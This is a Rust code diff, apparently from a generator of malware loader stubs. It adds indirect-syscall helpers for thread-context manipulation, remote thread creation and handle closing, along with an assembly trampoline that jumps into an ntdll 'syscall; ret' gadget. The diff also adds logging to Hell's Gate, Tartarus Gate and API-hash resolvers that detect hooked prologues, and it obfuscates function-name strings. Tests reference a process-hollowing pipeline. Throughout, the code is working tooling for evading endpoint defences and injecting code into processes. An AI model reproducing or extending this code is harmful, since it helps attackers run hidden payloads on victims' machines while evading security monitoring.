@@ -235,6 +235,11 @@ const ALLOC_VM_INDIRECT: &str = r#"    /// NtAllocateVirtualMemory(ProcessHandle
                 size as usize,
                 alloc_type as usize,
                 protect as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
                 ssns.alloc_vm,
                 *gadget,
             )
@@ -245,7 +250,8 @@ const ALLOC_VM_INDIRECT: &str = r#"    /// NtAllocateVirtualMemory(ProcessHandle
 /// `nt_write_vm`, mode none.
 const WRITE_VM_NONE: &str = r#"    /// NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer,
     /// NumberOfBytesToWrite, &NumberOfBytesWritten). None mode:
-    /// WriteProcessMemory mapped to an NTSTATUS.
+    /// WriteProcessMemory mapped to an NTSTATUS (the HRESULT carries the Win32
+    /// error, so a failure is diagnosable).
     pub fn nt_write_vm(
         process: HANDLE,
         base: *const core::ffi::c_void,
@@ -256,7 +262,7 @@ const WRITE_VM_NONE: &str = r#"    /// NtWriteVirtualMemory(ProcessHandle, BaseA
         unsafe {
             match WriteProcessMemory(process, base, buffer, size, Some(written)) {
                 Ok(()) => STATUS_SUCCESS,
-                Err(_) => STATUS_UNSUCCESSFUL,
+                Err(e) => e.code().0,
             }
         }
     }
@@ -286,6 +292,11 @@ const WRITE_VM_INDIRECT: &str = r#"    /// NtWriteVirtualMemory(ProcessHandle, B
                 size,
                 written as usize,
                 0,
+                0,
+                0,
+                0,
+                0,
+                0,
                 ssns.write_vm,
                 *gadget,
             )
@@ -296,7 +307,7 @@ const WRITE_VM_INDIRECT: &str = r#"    /// NtWriteVirtualMemory(ProcessHandle, B
 /// `nt_read_vm`, mode none.
 const READ_VM_NONE: &str = r#"    /// NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer,
     /// NumberOfBytesToRead, &NumberOfBytesRead). None mode: ReadProcessMemory
-    /// mapped to an NTSTATUS.
+    /// mapped to an NTSTATUS (the HRESULT carries the Win32 error).
     pub fn nt_read_vm(
         process: HANDLE,
         base: *const core::ffi::c_void,
@@ -307,7 +318,7 @@ const READ_VM_NONE: &str = r#"    /// NtReadVirtualMemory(ProcessHandle, BaseAdd
         unsafe {
             match ReadProcessMemory(process, base, buffer, size, Some(read)) {
                 Ok(()) => STATUS_SUCCESS,
-                Err(_) => STATUS_UNSUCCESSFUL,
+                Err(e) => e.code().0,
             }
         }
     }
@@ -336,6 +347,11 @@ const READ_VM_INDIRECT: &str = r#"    /// NtReadVirtualMemory(ProcessHandle, Bas
                 buffer as usize,
                 size,
                 read as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
                 0,
                 ssns.read_vm,
                 *gadget,
@@ -374,6 +390,11 @@ const RESUME_THREAD_INDIRECT: &str = r#"    /// NtResumeThread(ThreadHandle, &Pr
             nt_invoke(
                 thread.0 as usize,
                 previous as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
                 0,
                 0,
                 0,
@@ -417,6 +438,11 @@ const UNMAP_VIEW_INDIRECT: &str = r#"    /// NtUnmapViewOfSection(ProcessHandle,
             nt_invoke(
                 process.0 as usize,
                 base as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
                 0,
                 0,
                 0,
@@ -482,6 +508,11 @@ const PROTECT_VM_INDIRECT: &str = r#"    /// NtProtectVirtualMemory(ProcessHandl
                 new_protect as usize,
                 old_protect as usize,
                 0,
+                0,
+                0,
+                0,
+                0,
+                0,
                 ssns.protect_vm,
                 *gadget,
             )
@@ -519,6 +550,11 @@ const SUSPEND_THREAD_INDIRECT: &str = r#"    /// NtSuspendThread(ThreadHandle, &
             nt_invoke(
                 thread.0 as usize,
                 previous as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
                 0,
                 0,
                 0,
@@ -586,6 +622,11 @@ const QUERY_INFO_PROCESS_INDIRECT: &str = r#"    /// NtQueryInformationProcess(P
                 info_len as usize,
                 return_len as usize,
                 0,
+                0,
+                0,
+                0,
+                0,
+                0,
                 ssns.query_info_process,
                 *gadget,
             )
@@ -629,7 +670,317 @@ const GET_CONTEXT_THREAD_INDIRECT: &str = r#"    /// NtGetContextThread(ThreadHa
                 0,
                 0,
                 0,
+                0,
+                0,
+                0,
+                0,
+                0,
                 ssns.get_context_thread,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_set_context_thread`, mode none: windows-rs does not declare
+/// `NtSetContextThread`, so it is resolved dynamically (like `nt_get_context_thread`).
+/// `$SET_CONTEXT_FUNC_DEF$` is substituted by the renderer with a
+/// runtime-reconstructed (obfuscated) string.
+const SET_CONTEXT_THREAD_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type SetContextFn = unsafe extern "system" fn(HANDLE, *mut core::ffi::c_void) -> i32;
+
+    /// NtSetContextThread(ThreadHandle, &Context). None mode: resolve the
+    /// export dynamically (windows-rs does not declare it).
+    pub fn nt_set_context_thread(thread: HANDLE, context: *mut core::ffi::c_void) -> i32 {
+        let address = resolve_nt_export(&$SET_CONTEXT_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let set_context: SetContextFn = unsafe { std::mem::transmute(address) };
+        unsafe { set_context(thread, context) }
+    }
+"#;
+
+/// `nt_set_context_thread`, mode indirect.
+const SET_CONTEXT_THREAD_INDIRECT: &str = r#"    /// NtSetContextThread(ThreadHandle, &Context).
+    pub fn nt_set_context_thread(thread: HANDLE, context: *mut core::ffi::c_void) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                thread.0 as usize,
+                context as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.set_context_thread,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_create_thread_ex`, mode none: `CreateRemoteThread` (which also takes the
+/// current process handle), mapped to an NTSTATUS. The Win32 flag values differ
+/// from the native ones, so only the create-suspended bit is translated.
+const CREATE_THREAD_EX_NONE: &str = r#"    /// Signature of a thread start routine (one pointer argument).
+    type ThreadStartFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
+
+    /// Native `THREAD_CREATE_FLAGS_CREATE_SUSPENDED`; Win32 spells the same idea
+    /// `CREATE_SUSPENDED` with a different value (4), so the helper translates.
+    const THREAD_CREATE_FLAGS_CREATE_SUSPENDED: u32 = 0x0000_0001;
+    const WIN32_CREATE_SUSPENDED: u32 = 0x0000_0004;
+
+    /// NtCreateThreadEx(&ThreadHandle, DesiredAccess, &ObjectAttributes,
+    /// ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize,
+    /// MaximumStackSize, &AttributeList). None mode: `CreateRemoteThread` on
+    /// `process` (the current process handle works too).
+    pub fn nt_create_thread_ex(
+        process: HANDLE,
+        thread: *mut HANDLE,
+        start: usize,
+        argument: usize,
+        create_flags: u32,
+    ) -> i32 {
+        if start == 0 {
+            return STATUS_INVALID_PARAMETER;
+        }
+        let flags = if create_flags & THREAD_CREATE_FLAGS_CREATE_SUSPENDED != 0 {
+            WIN32_CREATE_SUSPENDED
+        } else {
+            0
+        };
+        let start: ThreadStartFn = unsafe { std::mem::transmute(start) };
+        unsafe {
+            match CreateRemoteThread(
+                process,
+                None,
+                0,
+                Some(start),
+                Some(argument as *const core::ffi::c_void),
+                flags,
+                None,
+            ) {
+                Ok(handle) => {
+                    if !thread.is_null() {
+                        *thread = handle;
+                    }
+                    STATUS_SUCCESS
+                }
+                Err(_) => STATUS_UNSUCCESSFUL,
+            }
+        }
+    }
+"#;
+
+/// `nt_create_thread_ex`, mode indirect.
+const CREATE_THREAD_EX_INDIRECT: &str = r#"    /// Native `THREAD_CREATE_FLAGS_CREATE_SUSPENDED` (accepted by
+    /// `NtCreateThreadEx` as-is).
+    const THREAD_CREATE_FLAGS_CREATE_SUSPENDED: u32 = 0x0000_0001;
+
+    /// `THREAD_ALL_ACCESS`; the native bitmask (not the Win32 constant, which
+    /// only matches on Vista+).
+    const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
+
+    /// NtCreateThreadEx(&ThreadHandle, DesiredAccess, &ObjectAttributes,
+    /// ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize,
+    /// MaximumStackSize, &AttributeList). Eleven arguments — the widest call the
+    /// trampoline carries.
+    pub fn nt_create_thread_ex(
+        process: HANDLE,
+        thread: *mut HANDLE,
+        start: usize,
+        argument: usize,
+        create_flags: u32,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                thread as usize,
+                THREAD_ALL_ACCESS as usize,
+                0,
+                process.0 as usize,
+                start,
+                argument,
+                create_flags as usize,
+                0,
+                0,
+                0,
+                0,
+                ssns.create_thread_ex,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_wait_for_single_object`, mode none: `WaitForSingleObject` already returns
+/// the NTSTATUS-compatible `WAIT_*` values (`WAIT_OBJECT_0` = `STATUS_SUCCESS`,
+/// `WAIT_TIMEOUT` = `STATUS_TIMEOUT`, `WAIT_FAILED` = `0xFFFFFFFF`).
+const WAIT_FOR_SINGLE_OBJECT_NONE: &str = r#"    /// NtWaitForSingleObject(Handle, Alertable, &Timeout). None mode:
+    /// `WaitForSingleObject` in milliseconds (`u32::MAX` = infinite).
+    pub fn nt_wait_for_single_object(handle: HANDLE, timeout_ms: u32) -> i32 {
+        unsafe { WaitForSingleObject(handle, timeout_ms).0 as i32 }
+    }
+"#;
+
+/// `nt_wait_for_single_object`, mode indirect. The 100 ns relative timeout is
+/// derived from the millisecond value the callers use.
+const WAIT_FOR_SINGLE_OBJECT_INDIRECT: &str = r#"    /// NtWaitForSingleObject(Handle, Alertable, &Timeout).
+    pub fn nt_wait_for_single_object(handle: HANDLE, timeout_ms: u32) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        // A relative timeout is negative and in 100 ns units; an infinite wait
+        // passes a null pointer.
+        let mut timeout: i64 = 0;
+        let timeout_ptr = if timeout_ms == u32::MAX {
+            std::ptr::null_mut()
+        } else {
+            timeout = -i64::from(timeout_ms) * 10_000;
+            &mut timeout
+        };
+        unsafe {
+            nt_invoke(
+                handle.0 as usize,
+                0,
+                timeout_ptr as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.wait_for_single_object,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_query_info_thread`, mode none: windows-rs does not declare
+/// `NtQueryInformationThread`, so it is resolved dynamically (like
+/// `nt_query_info_process`). `$QUERY_THREAD_FUNC_DEF$` is substituted by the
+/// renderer with a runtime-reconstructed (obfuscated) string.
+const QUERY_INFO_THREAD_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type QueryThreadFn = unsafe extern "system" fn(
+        HANDLE,
+        i32,
+        *mut core::ffi::c_void,
+        u32,
+        *mut u32,
+    ) -> i32;
+
+    /// NtQueryInformationThread(ThreadHandle, ThreadInformationClass,
+    /// ThreadInformation, ThreadInformationLength, ReturnLength). None mode:
+    /// resolve the export dynamically (windows-rs does not declare it).
+    pub fn nt_query_info_thread(
+        thread: HANDLE,
+        info_class: i32,
+        info: *mut core::ffi::c_void,
+        info_len: u32,
+        return_len: *mut u32,
+    ) -> i32 {
+        let address = resolve_nt_export(&$QUERY_THREAD_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let query: QueryThreadFn = unsafe { std::mem::transmute(address) };
+        unsafe { query(thread, info_class, info, info_len, return_len) }
+    }
+"#;
+
+/// `nt_query_info_thread`, mode indirect.
+const QUERY_INFO_THREAD_INDIRECT: &str = r#"    /// NtQueryInformationThread(ThreadHandle, ThreadInformationClass,
+    /// ThreadInformation, ThreadInformationLength, ReturnLength).
+    pub fn nt_query_info_thread(
+        thread: HANDLE,
+        info_class: i32,
+        info: *mut core::ffi::c_void,
+        info_len: u32,
+        return_len: *mut u32,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                thread.0 as usize,
+                info_class as usize,
+                info as usize,
+                info_len as usize,
+                return_len as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.query_info_thread,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_close`, mode none.
+const CLOSE_NONE: &str = r#"    /// NtClose(Handle). None mode: CloseHandle mapped to an NTSTATUS.
+    pub fn nt_close(handle: HANDLE) -> i32 {
+        unsafe {
+            match CloseHandle(handle) {
+                Ok(()) => STATUS_SUCCESS,
+                Err(_) => STATUS_UNSUCCESSFUL,
+            }
+        }
+    }
+"#;
+
+/// `nt_close`, mode indirect.
+const CLOSE_INDIRECT: &str = r#"    /// NtClose(Handle).
+    pub fn nt_close(handle: HANDLE) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                handle.0 as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.close,
                 *gadget,
             )
         }
@@ -700,6 +1051,41 @@ const NT_FUNCTIONS: &[NtFunction] = &[
         helper_name: "nt_get_context_thread",
         helper_none: GET_CONTEXT_THREAD_NONE,
         helper_indirect: GET_CONTEXT_THREAD_INDIRECT,
+    },
+    NtFunction {
+        name: "NtSetContextThread",
+        table_field: "set_context_thread",
+        helper_name: "nt_set_context_thread",
+        helper_none: SET_CONTEXT_THREAD_NONE,
+        helper_indirect: SET_CONTEXT_THREAD_INDIRECT,
+    },
+    NtFunction {
+        name: "NtCreateThreadEx",
+        table_field: "create_thread_ex",
+        helper_name: "nt_create_thread_ex",
+        helper_none: CREATE_THREAD_EX_NONE,
+        helper_indirect: CREATE_THREAD_EX_INDIRECT,
+    },
+    NtFunction {
+        name: "NtWaitForSingleObject",
+        table_field: "wait_for_single_object",
+        helper_name: "nt_wait_for_single_object",
+        helper_none: WAIT_FOR_SINGLE_OBJECT_NONE,
+        helper_indirect: WAIT_FOR_SINGLE_OBJECT_INDIRECT,
+    },
+    NtFunction {
+        name: "NtQueryInformationThread",
+        table_field: "query_info_thread",
+        helper_name: "nt_query_info_thread",
+        helper_none: QUERY_INFO_THREAD_NONE,
+        helper_indirect: QUERY_INFO_THREAD_INDIRECT,
+    },
+    NtFunction {
+        name: "NtClose",
+        table_field: "close",
+        helper_name: "nt_close",
+        helper_none: CLOSE_NONE,
+        helper_indirect: CLOSE_INDIRECT,
     },
 ];
 
@@ -814,20 +1200,25 @@ const EMPTY_BODY: &str = r#"    /// Initializes the syscall layer. A no-op here:
 
 /// Prelude shared by every `mode: none` block (imports + no-op init).
 const NONE_PRELUDE: &str = r#"    use windows::core::PCSTR;
-    use windows::Win32::Foundation::HANDLE;
+    use windows::Win32::Foundation::{CloseHandle, HANDLE};
     use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
     use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
     use windows::Win32::System::Memory::{
         VirtualAllocEx, VirtualProtectEx, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
     };
-    use windows::Win32::System::Threading::{ResumeThread, SuspendThread};
+    use windows::Win32::System::Threading::{
+        CreateRemoteThread, ResumeThread, SuspendThread, WaitForSingleObject,
+    };
 
     const STATUS_SUCCESS: i32 = 0;
     /// Generic failure for a mapped Win32 call that has no real NTSTATUS.
     const STATUS_UNSUCCESSFUL: i32 = 0xC000_0001u32 as i32;
+    /// Invalid parameter (a null thread start routine, for instance).
+    const STATUS_INVALID_PARAMETER: i32 = 0xC000_000Du32 as i32;
 
     /// Initializes the syscall layer. A no-op when syscalls are disabled.
     pub fn init_syscalls() -> Result<(), String> {
+        crate::tech_dbg!("syscalls", "mode none: the nt_* helpers call the Win32 APIs directly");
         Ok(())
     }
 
@@ -870,17 +1261,23 @@ const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
 
     /// Invokes one NT syscall through the `syscall; ret` gadget in ntdll.
     ///
-    /// Windows x64 ABI: arguments 1-4 arrive in rcx/rdx/r8/r9, every further
-    /// argument on the caller's stack — after the return address and the
-    /// 32-byte shadow space, the callee sees argument 5 at [rsp+40], 6 at
-    /// [rsp+48], 7 at [rsp+56] and 8 at [rsp+64].
+    /// Windows x64 ABI: arguments 1-4 arrive in rcx/rdx/r8/r9 and every further
+    /// argument on the caller's stack, at [rsp+40], [rsp+48], ... (the callee
+    /// sees argument 5 at [rsp+40]: 8 bytes of return address plus the 32-byte
+    /// shadow space). `syscall` does not push a return address, so the kernel
+    /// reads arguments 5+ from exactly those slots — the caller has already
+    /// placed them where the kernel expects them, and the trampoline must not
+    /// touch them.
     ///
-    /// The `syscall` instruction expects arguments 1-4 in the same registers,
-    /// argument 1 *also* in r10, the SSN in eax, and arguments 5-6 at
-    /// [rsp+8]/[rsp+16] (rsp points at the return address when the gadget
-    /// runs). `nt_invoke` rearranges the frame accordingly and jumps into the
-    /// gadget; the gadget's trailing `ret` pops our caller's return address
-    /// and goes straight back to the Rust caller.
+    /// It only sets the three registers `syscall` needs: r10 = argument 1, eax
+    /// = SSN, and r11 = the gadget address (the `syscall; ret` sequence). The
+    /// gadget's trailing `ret` pops the caller's return address and goes
+    /// straight back to the Rust caller.
+    ///
+    /// The signature is fixed at eleven argument slots (`NtCreateThreadEx` is
+    /// the widest call a technique needs; the SSN/gadget pair follows them), so
+    /// callers pass unused slots as `0`. The two trailing parameters land after
+    /// every syscall argument, which is why they never reach the kernel.
     extern "system" {
         fn nt_invoke(
             arg1: usize,
@@ -889,6 +1286,11 @@ const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
             arg4: usize,
             arg5: usize,
             arg6: usize,
+            arg7: usize,
+            arg8: usize,
+            arg9: usize,
+            arg10: usize,
+            arg11: usize,
             ssn: u32,
             gadget: usize,
         ) -> i32;
@@ -898,15 +1300,9 @@ const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
         ".intel_syntax noprefix",
         ".global nt_invoke",
         "nt_invoke:",
-        // Register args are already where the syscall wants them; only the
-        // stack args (5/6) and the trailing SSN/gadget (7/8) need to move.
-        "mov r10, rcx",        // r10 = arg1 (syscall argument convention)
-        "mov rax, [rsp + 40]", // rax = arg5
-        "mov [rsp + 8], rax",  // the syscall reads arg5 from [rsp+8]
-        "mov rax, [rsp + 48]", // rax = arg6
-        "mov [rsp + 16], rax", // the syscall reads arg6 from [rsp+16]
-        "mov eax, [rsp + 56]", // eax = SSN
-        "mov r11, [rsp + 64]", // r11 = gadget address (syscall; ret)
+        "mov r10, rcx",         // r10 = arg1 (syscall argument convention)
+        "mov eax, [rsp + 96]",  // eax = SSN (arg12)
+        "mov r11, [rsp + 104]", // r11 = gadget address (syscall; ret, arg13)
         "jmp r11",
     );
 
@@ -940,9 +1336,13 @@ $SSN_FIELDS$
     /// Resolves every SSN the active techniques need and caches the gadget.
     /// The stub calls this once, before the techniques run.
     pub fn init_syscalls() -> Result<(), String> {
-        let (table, gadget) = resolve_ssns().map_err(|e| e.to_string())?;
+        let (table, gadget) = resolve_ssns().map_err(|e| {
+            crate::tech_dbg!("syscalls", "initialization failed: {e}");
+            e.to_string()
+        })?;
         let _ = SSNS.set(table);
         let _ = GADGET.set(gadget);
+        crate::tech_dbg!("syscalls", "ssn table resolved, gadget at 0x{gadget:x}");
         Ok(())
     }
 
@@ -1047,8 +1447,17 @@ $SSN_RESOLVE$
         };
         let prologue = unsafe { std::slice::from_raw_parts(address as *const u8, 8) };
         match parse_ssn(prologue) {
-            Some(ssn) => Ok(ssn),
-            None => Err(SyscallError::PatternMismatch(name.to_string())),
+            Some(ssn) => {
+                crate::tech_dbg!("syscalls", "hells_gate: {name} -> SSN {ssn}");
+                Ok(ssn)
+            }
+            None => {
+                crate::tech_dbg!(
+                    "syscalls",
+                    "hells_gate: {name} has a hooked prologue (pattern mismatch)"
+                );
+                Err(SyscallError::PatternMismatch(name.to_string()))
+            }
         }
     }
 "#;
@@ -1133,8 +1542,17 @@ $SSN_RESOLVE$
             .get(offset..end)
             .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
         match parse_ssn(prologue) {
-            Some(ssn) => Ok(ssn),
-            None => Err(SyscallError::PatternMismatch(name.to_string())),
+            Some(ssn) => {
+                crate::tech_dbg!("syscalls", "tartarus_gate: {name} -> SSN {ssn}");
+                Ok(ssn)
+            }
+            None => {
+                crate::tech_dbg!(
+                    "syscalls",
+                    "tartarus_gate: {name} has a hooked prologue (pattern mismatch)"
+                );
+                Err(SyscallError::PatternMismatch(name.to_string()))
+            }
         }
     }
 
@@ -1234,8 +1652,17 @@ $SSN_RESOLVE$
             .get(offset..end)
             .ok_or_else(|| SyscallError::FunctionNotFound(format!("0x{hash:016x}")))?;
         match parse_ssn(prologue) {
-            Some(ssn) => Ok(ssn),
-            None => Err(SyscallError::PatternMismatch(format!("0x{hash:016x}"))),
+            Some(ssn) => {
+                crate::tech_dbg!("syscalls", "api_hash: 0x{hash:016x} -> SSN {ssn}");
+                Ok(ssn)
+            }
+            None => {
+                crate::tech_dbg!(
+                    "syscalls",
+                    "api_hash: 0x{hash:016x} has a hooked prologue (pattern mismatch)"
+                );
+                Err(SyscallError::PatternMismatch(format!("0x{hash:016x}")))
+            }
         }
     }
 
@@ -1300,6 +1727,12 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
     let get_context_def = strings
         .obfuscate("NtGetContextThread")
         .render_stub_expr("get_context_name");
+    let set_context_def = strings
+        .obfuscate("NtSetContextThread")
+        .render_stub_expr("set_context_name");
+    let query_thread_def = strings
+        .obfuscate("NtQueryInformationThread")
+        .render_stub_expr("query_thread_name");
 
     let mut out = String::from(NONE_PRELUDE);
     for f in required {
@@ -1310,6 +1743,8 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
         .replace("$UNMAP_FUNC_DEF$", &unmap_def)
         .replace("$QUERY_FUNC_DEF$", &query_def)
         .replace("$GET_CONTEXT_FUNC_DEF$", &get_context_def)
+        .replace("$SET_CONTEXT_FUNC_DEF$", &set_context_def)
+        .replace("$QUERY_THREAD_FUNC_DEF$", &query_thread_def)
 }
 
 /// Renders the `mode: indirect` body: the prelude (with the SSN table fields,
@@ -1557,6 +1992,13 @@ mod tests {
                 "NtUnmapViewOfSection",
                 "NtProtectVirtualMemory",
                 "NtSuspendThread",
+                "NtQueryInformationProcess",
+                "NtGetContextThread",
+                "NtSetContextThread",
+                "NtCreateThreadEx",
+                "NtWaitForSingleObject",
+                "NtQueryInformationThread",
+                "NtClose",
             ]
         );
     }
@@ -1573,7 +2015,7 @@ mod tests {
         // must still deduplicate (defensive).
         let pipeline = hollowing_pipeline();
         let names: BTreeSet<&str> = required(&pipeline).into_iter().collect();
-        assert_eq!(names.len(), 7, "no duplicates expected");
+        assert_eq!(names.len(), 14, "no duplicates expected");
     }
 
     // --- Hell's Gate parsing (unit-tested reference for the stub) ---
